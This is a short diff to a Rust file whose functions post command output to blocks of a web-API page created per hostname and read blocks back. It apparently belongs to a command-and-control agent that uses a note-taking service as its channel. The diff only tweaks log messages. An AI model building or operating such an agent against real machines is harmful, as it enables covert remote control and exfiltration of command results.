@@ -31,6 +31,7 @@ pub async fn send_result(client: &Client, command_block_id: &str, output: String
         }))
         .collect();
 
+
     let url = format!("{URL_BASE}/blocks/{command_block_id}/children");
     let body : serde_json::Value = json!({
         "children": chunks
@@ -52,7 +53,7 @@ pub async fn send_result(client: &Client, command_block_id: &str, output: String
 /// The returned value is the id of the new page, to be used with
 /// `doc::get_blocks()`
 pub async fn create_page(client: &Client, config_options: &ConfigOptions, hostname: String) -> Option<String> {
-    println!("Creating page...");
+    println!("[+] Creating page...");
     let url = format!("{}/pages/", URL_BASE);
     
     // Craft JSON Body
@@ -92,11 +93,11 @@ pub async fn get_blocks(client: &Client, page_id: &String) -> Result<serde_json:
     let r = client.get(url).send().await.unwrap();
 
     if r.status().is_success() {
-        println!("Got blocks");
+        //println!("[*] Got blocks");
         let blocks = r.json::<serde_json::Value>().await.unwrap();
         match blocks.get("results") {
             Some(bs) => {
-                println!("{:?}", bs);
+                //println!("{:?}", bs);
                 return Ok(bs.to_owned())
             },
             None => return Ok(json!([]))
